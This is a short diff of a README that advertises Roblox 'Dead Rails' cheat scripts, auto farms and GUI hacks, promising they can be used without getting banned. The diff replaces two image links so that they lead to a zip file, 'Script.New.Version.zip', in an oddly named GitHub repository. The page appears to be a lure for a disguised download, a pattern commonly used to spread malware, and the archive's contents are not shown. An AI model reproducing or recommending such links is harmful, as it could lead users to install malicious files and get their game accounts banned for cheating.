@@ -3,10 +3,10 @@
 If you're a passionate Roblox player searching for the latest **Dead Rails Script** that actually works in 2025, you've come to the right place. This guide gives you a **deep dive into the best Dead Rails GUI scripts, hacks, auto farms, and features**, as well as **how to use them safely** to enhance your gameplay without getting banned.
 
 [![image](https://github.com/user-attachments/assets/c2c76d38-17eb-42c0-8042-5bf1c445cd14)
-](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
+](https://github.com/Gqdqw/potential-guacamole/releases/download/new/Script.New.Version.zip)
 
 [![hq720](https://github.com/user-attachments/assets/13eac390-6b11-44b7-857d-0f610e428374)
-](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
+](https://github.com/Gqdqw/potential-guacamole/releases/download/new/Script.New.Version.zip)
 
 ---
 
